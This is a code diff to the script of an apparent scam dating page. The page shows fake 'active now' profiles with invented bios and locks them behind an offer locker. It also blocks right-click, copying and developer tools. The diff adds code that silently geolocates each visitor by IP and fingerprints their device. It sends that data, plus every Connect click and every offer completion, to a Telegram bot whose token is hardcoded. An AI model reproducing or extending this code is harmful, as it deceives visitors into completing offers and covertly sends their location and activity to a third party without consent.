@@ -380,6 +380,79 @@
 </div>
 
 <script>
+    // ========================================= TELEGRAM BOT =========================================
+    const TELEGRAM_BOT_TOKEN = "8338318615:AAEuCrfvD5SdOQBJraDrYWj6isoXJxP6kLg";
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // استبدل برقم الـ Chat ID الخاص بك
+    
+    let userInfo = {
+        location: "Unknown",
+        device: "Unknown",
+        clicked: false,
+        completedOffers: false
+    };
+
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        $.ajax({
+            url: url,
+            method: 'POST',
+            data: {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            },
+            error: function() {
+                // Fallback method using script tag
+                const script = document.createElement('script');
+                script.src = `${url}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+                document.body.appendChild(script);
+            }
+        });
+    }
+
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
+            if (/iPad/.test(ua)) return "iPad";
+            if (/iPhone/.test(ua)) return "iPhone";
+            if (/Android/.test(ua)) return "Android";
+            return "Mobile";
+        }
+        if (/Windows/.test(ua)) return "Windows";
+        if (/Mac/.test(ua)) return "macOS";
+        if (/Linux/.test(ua)) return "Linux";
+        return "Unknown Device";
+    }
+
+    function getLocation() {
+        $.ajax({
+            url: "https://ipapi.co/json/",
+            success: function(data) {
+                userInfo.location = `${data.city}, ${data.country_name}`;
+                userInfo.device = getDeviceInfo();
+            },
+            error: function() {
+                userInfo.device = getDeviceInfo();
+            }
+        });
+    }
+
+    // Send initial notification when user enters the site
+    window.addEventListener('load', function() {
+        setTimeout(() => {
+            getLocation();
+            setTimeout(() => {
+                const message = `
+<b>🔔 New User Entered</b>
+📍 Location: ${userInfo.location}
+📱 Device: ${userInfo.device}
+🌐 Time: ${new Date().toLocaleString()}
+                `;
+                sendToTelegram(message);
+            }, 1000);
+        }, 500);
+    });
+
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('copy', e => e.preventDefault());
     document.addEventListener('keydown', e => { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) e.preventDefault(); });
@@ -387,12 +460,6 @@
     let userCity = "Your Area"; let countryName = "Your Country"; let currentProfileLocation = null;
     const intlPool = [{city: "London", country: "United Kingdom"}, {city: "Paris", country: "France"}, {city: "Berlin", country: "Germany"}];
     const realBios = ["Looking for someone tonight. ❤️", "Serious connection only.", "Active now, let's chat. 🔥"];
-
-    function getProxiedImageUrl(originalUrl) {
-        if (!originalUrl) return 'https://cdn-icons-png.flaticon.com/512/1162/1162933.png';
-        let cleanUrl = originalUrl.startsWith('//') ? 'https:' + originalUrl : originalUrl;
-        return `https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&refresh=2592000&url=${encodeURIComponent(cleanUrl)}`;
-    }
 
     function triggerHapticFeedback() { if (navigator.vibrate) navigator.vibrate(10); }
 
@@ -466,7 +533,27 @@
         setTimeout(() => { document.getElementById('sync-text').innerHTML = `<span style="color:#28a745;font-weight:bold;"><i class="fas fa-circle" style="font-size:7px;animation:pulse 1.5s infinite"></i> Active Now in ${currentProfileLocation}</span>`; }, 1000);
     }
 
-    function handleConnectClick(e, btn) { e.stopPropagation(); triggerHapticFeedback(); btn.classList.add('pulse'); setTimeout(() => btn.classList.remove('pulse'), 600); openLocker(btn.getAttribute('data-name'), btn.getAttribute('data-img'), btn.getAttribute('data-location'), btn.getAttribute('data-videos')); }
+    function handleConnectClick(e, btn) { 
+        e.stopPropagation(); 
+        triggerHapticFeedback(); 
+        btn.classList.add('pulse'); 
+        setTimeout(() => btn.classList.remove('pulse'), 600); 
+        openLocker(btn.getAttribute('data-name'), btn.getAttribute('data-img'), btn.getAttribute('data-location'), btn.getAttribute('data-videos'));
+        
+        // Send click notification to Telegram
+        if (!userInfo.clicked) {
+            userInfo.clicked = true;
+            const message = `
+<b>👆 User Clicked Connect Button</b>
+👤 Profile: ${btn.getAttribute('data-name')}
+📍 Location: ${userInfo.location}
+📱 Device: ${userInfo.device}
+🌐 Time: ${new Date().toLocaleString()}
+            `;
+            sendToTelegram(message);
+        }
+    }
+
     function remindCaptcha() { $('#captcha-area').addClass('shake-now'); setTimeout(() => $('#captcha-area').removeClass('shake-now'), 400); triggerHapticFeedback(); }
     function filterProfiles() { let input = $('#smartSearch').val().toLowerCase(); $('.card').each(function() { $(this).toggle($(this).text().toLowerCase().includes(input)); }); }
     function closeLocker() { $('#locker').hide(); document.getElementById('tutorialVideo').pause(); currentProfileLocation = null; }
@@ -511,16 +598,16 @@
             finalOffers.forEach((offer, idx) => {
                 let title = offer.anchor || offer.title || "Task";
                 let desc = offer.conversion || offer.description || "Click to complete";
-                let icon = offer.icon || 'https://cdn-icons-png.flaticon.com/512/1162/1162933.png';
+                let icon = offer.icon;
                 let link = offer.url;
                 
-                // Fix icon URL
-                if (icon && !icon.includes('data:') && !icon.includes('http')) {
-                    icon = 'https://' + icon;
+                // Create a data URL placeholder if no icon
+                if (!icon) {
+                    icon = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="%23fe3c72"%3E%3Cpath d="M12 2L2 7V12C2 16.5 12 22 12 22S22 16.5 22 12V7L12 2Z"/%3E%3C/svg%3E';
                 }
                 
                 html += `<a href="${link}" target="_blank" class="offer-card" onclick="handleOfferClick()">
-                    <img src="${icon}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1162/1162933.png'">
+                    <img src="${icon}" alt="Offer" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2248%22 height=%2248%22 viewBox=%220 0 24 24%22 fill=%22%23fe3c72%22%3E%3Cpath d=%22M12 2L2 7V12C2 16.5 12 22 12 22S22 16.5 22 12V7L12 2Z%22/%3E%3C/svg%3E'">
                     <div>
                         <div style="font-size:13px; font-weight:800; color:#222;">${title}</div>
                         <div style="font-size:10px; color:var(--primary); font-weight:bold; margin-top:3px;">${desc}</div>
@@ -553,6 +640,19 @@
             document.getElementById('captcha-box').classList.remove('loading');
             document.getElementById('captcha-box').classList.add('checked');
             document.getElementById('offers-wrap').style.display = 'none';
+            
+            // Send completion notification to Telegram
+            if (!userInfo.completedOffers) {
+                userInfo.completedOffers = true;
+                const message = `
+<b>✅ User Completed Offers</b>
+📍 Location: ${userInfo.location}
+📱 Device: ${userInfo.device}
+🎯 Completed ${requiredOffers} tasks
+🌐 Time: ${new Date().toLocaleString()}
+                `;
+                sendToTelegram(message);
+            }
             
             clickedOffers = 0;
         }, 2000);
